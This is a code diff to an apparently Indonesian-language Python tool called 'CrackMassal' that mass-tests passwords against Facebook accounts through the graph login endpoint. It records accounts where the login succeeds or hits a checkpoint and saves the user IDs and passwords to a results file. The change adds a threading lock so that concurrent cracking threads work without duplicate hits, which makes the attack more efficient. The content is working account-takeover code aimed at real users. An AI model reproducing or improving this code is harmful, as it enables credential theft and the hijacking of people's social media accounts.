@@ -26,6 +26,7 @@ class CrackMassal:
         self.cracked_uids = set()
         self.mesin = BloksIdentityEngine()
         self.enc = FacebookRSAEncrypter()
+        self.lock = threading.Lock()
     def banner(self):
         os.system('cls' if os.name == 'nt' else 'clear')
         print(f"""{U}
@@ -108,18 +109,22 @@ class CrackMassal:
             res = requests.post("https://b-graph.facebook.com/graphql", headers=headers, data=payload, timeout=15)
             resp = res.text
             if "access_token" in resp:
-                self.cracked_uids.add(uid)
-                self.parse_success(resp, uid, name, pw, m.user_agent)
+                with self.lock:
+                    if uid not in self.cracked_uids:
+                        self.cracked_uids.add(uid)
+                        self.parse_success(resp, uid, name, pw, m.user_agent)
             elif "checkpoint" in resp.lower():
-                self.cracked_uids.add(uid)
-                print(f"\n{K} ┌──────── {K}AKUN CHECKPOINT{K} ────────┐")
-                print(f" {P}│ NAMA     : {name}")
-                print(f" {P}│ ID       : {uid}")
-                print(f" {P}│ PASSWORD : {pw}")
-                print(f" {P}│ STATUS   : {M}CHECKPOINT (Lock)")
-                print(f"{K} └──────────────────────────────────┘{P}")
-                self.save_result("Results", "CP.txt", f"{uid}|{pw}")
-                self.cp += 1
+                with self.lock:
+                    if uid not in self.cracked_uids:
+                        self.cracked_uids.add(uid)
+                        print(f"\n{K} ┌──────── {K}AKUN CHECKPOINT{K} ────────┐")
+                        print(f" {P}│ NAMA     : {name}")
+                        print(f" {P}│ ID       : {uid}")
+                        print(f" {P}│ PASSWORD : {pw}")
+                        print(f" {P}│ STATUS   : {M}CHECKPOINT (Lock)")
+                        print(f"{K} └──────────────────────────────────┘{P}")
+                        self.save_result("Results", "CP.txt", f"{uid}|{pw}")
+                        self.cp += 1
             elif "e53" in resp.lower() or "error_message" in resp.lower():
                 pass
         except Exception:
